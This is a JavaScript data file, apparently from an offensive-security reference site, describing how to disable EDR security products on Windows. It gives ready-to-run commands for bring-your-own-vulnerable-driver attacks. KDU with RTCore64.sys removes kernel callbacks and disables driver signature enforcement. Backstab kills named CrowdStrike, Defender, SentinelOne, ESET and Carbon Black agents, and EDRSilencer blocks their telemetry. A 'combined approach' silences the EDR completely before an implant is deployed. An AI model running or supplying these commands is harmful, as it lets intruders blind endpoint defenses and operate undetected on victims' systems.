export const kernelTechniques = [
  {
    id: 'kernel-callbacks',
    title: 'Kernel Callback Removal (BYOVD)',
    subtitle: 'Remove EDR PsNotify/LoadImage/Thread kernel callbacks via a vulnerable driver\'s R/W primitive to completely blind process monitoring',
    tags: ['BYOVD', 'PsSetCreateProcessNotifyRoutine', 'PsSetLoadImageNotifyRoutine', 'PsSetCreateThreadNotifyRoutine', 'KDU', 'RTCore64.sys', 'Backstab', 'EDRSilencer', 'callback array patch', 'PPL bypass'],
    accentColor: 'red',
    overview: 'EDRs register kernel notification callbacks that fire synchronously on every process creation (PsSetCreateProcessNotifyRoutine), DLL/module load (PsSetLoadImageNotifyRoutine), and thread creation (PsSetCreateThreadNotifyRoutine). These are the kernel\'s most powerful observability hooks — the EDR is notified before any action completes. BYOVD (Bring Your Own Vulnerable Driver) exploits an arbitrary kernel read/write primitive in a legitimate signed driver to null out the EDR\'s entries in the callback pointer array. KDU automates this across 300+ known vulnerable drivers. After removal, the EDR is completely blind to all process and thread events — no telemetry, no blocking.',
    steps: [
      'EDR kernel callbacks fire synchronously before process/thread/module actions complete — the EDR can block them',
      'Callback arrays are kernel structures containing function pointers registered by EDR driver (csagent.sys, SentinelMonitor.sys, MsMpEng)',
      'BYOVD: load a legitimate signed driver with kernel R/W primitive; use it to null EDR callback entries',
      'KDU: kdu.exe -prov <N> -cmd REMOVE_CALLBACKS — supports 300+ vulnerable drivers, auto-detects OS, patches callback tables',
      'PPL (Protected Process Light): EDR agents often run as PPL — cannot kill normally; Backstab uses BYOVD to kill PPL-protected processes',
      'EDRSilencer: no driver required — uses Windows Filtering Platform (WFP) to block EDR network telemetry (no cloud correlation)',
      'Confirm callback removal: after kdu.exe, deploy implant and observe if EDR still generates process creation alerts',
    ],
    commands: [
      {
        title: 'KDU — kernel callback removal and PPL bypass',
        code: `# ── KDU (Kernel Driver Utility) ──
# https://github.com/hfiref0x/KDU
# Requires: local admin, test signing OFF (production Windows)

# List all available vulnerable driver providers
kdu.exe -list
# Output: Provider list with ID, name, driver name, exploit type

# Remove ALL EDR kernel callbacks (process/thread/image notify)
kdu.exe -prov 9 -cmd REMOVE_CALLBACKS
# -prov 9 = RTCore64.sys (MSI Afterburner) — widely available, reliable R/W primitive
# After this: EDR cannot see new process creation, DLL loads, or thread creation

# Kill a PPL-protected process (Backstab integration)
kdu.exe -prov 9 -ps <EDR_PID>
# Kills the process by downgrading PPL protection via kernel patch then TerminateProcess

# Disable Driver Signature Enforcement (DSE)
kdu.exe -prov 9 -dse 0   # Disable
kdu.exe -prov 9 -dse 6   # Re-enable

# Common vulnerable drivers (all signed, all available):
# RTCore64.sys   (MSI Afterburner / prov 9)  — arbitrary R/W
# dbutil_2_3.sys (Dell driver / prov 11)     — arbitrary code exec
# gdrv.sys       (Gigabyte / prov 6)         — arbitrary R/W
# iqvw64e.sys    (Intel NIC driver)           — arbitrary R/W
# zamguard64.sys (Zemana AntiMalware)         — process kill only

# ── Load driver manually (if not using KDU) ──
sc.exe create vuln type= kernel binPath= "C:\\Windows\\Temp\\RTCore64.sys"
sc.exe start vuln
# Then communicate via DeviceIoControl with the driver's IOCTL interface
# To perform arbitrary kernel R/W and null EDR callback pointers`
      },
      {
        title: 'Backstab — kill PPL-protected EDR processes',
        code: `# ── Backstab — PPL process termination ──
# https://github.com/Yaxser/Backstab
# Uses PPLKiller technique (via vulnerable driver) to kill PPL-protected EDR agents

# Kill specific EDR processes
Backstab.exe -n csagent.exe -k          # CrowdStrike Falcon agent
Backstab.exe -n CSFalconService.exe -k  # CrowdStrike service
Backstab.exe -n MsMpEng.exe -k         # Windows Defender engine
Backstab.exe -n SentinelAgent.exe -k   # SentinelOne agent
Backstab.exe -n SentinelStaticEngine.exe -k
Backstab.exe -n ekrn.exe -k            # ESET kernel component
Backstab.exe -n cb.exe -k              # Carbon Black

# List all running protected processes
Backstab.exe -l

# Kill by PID
Backstab.exe -p <PID> -k

# ── EDRSilencer — block EDR telemetry without a driver ──
# https://github.com/netero1010/EDRSilencer
# Uses Windows Filtering Platform (WFP) callout to block outbound EDR connections
# Does NOT kill EDR — just severs cloud telemetry (Overwatch/cloud correlation blind)

EDRSilencer.exe blockedr              # Auto-block all known EDR processes
EDRSilencer.exe block csagent.exe    # Block specific process
EDRSilencer.exe block SentinelAgent.exe
EDRSilencer.exe block MsMpEng.exe

EDRSilencer.exe unblockall           # Remove all WFP filters (cleanup)

# ── Combined approach ──
# 1. KDU: remove kernel callbacks    → process monitoring blind
# 2. EDRSilencer: block telemetry    → cloud correlation blind
# 3. Backstab: kill PPL agent        → userland components dead
# Result: EDR completely silenced without rebooting or uninstalling`
      }
    ]
  },
];